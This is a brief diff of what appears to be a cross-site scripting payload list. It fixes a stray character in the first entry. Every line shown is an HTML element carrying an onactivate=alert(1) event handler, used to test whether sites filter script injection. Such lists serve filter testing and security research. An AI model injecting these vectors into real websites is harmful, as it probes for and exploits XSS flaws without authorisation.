@@ -1,4 +1,4 @@
-<a id=x tabindex=1 onactivate=alert(1)></a>a
+<a id=x tabindex=1 onactivate=alert(1)></a>
 <abbr id=x tabindex=1 onactivate=alert(1)></abbr>
 <acronym id=x tabindex=1 onactivate=alert(1)></acronym>
 <address id=x tabindex=1 onactivate=alert(1)></address>
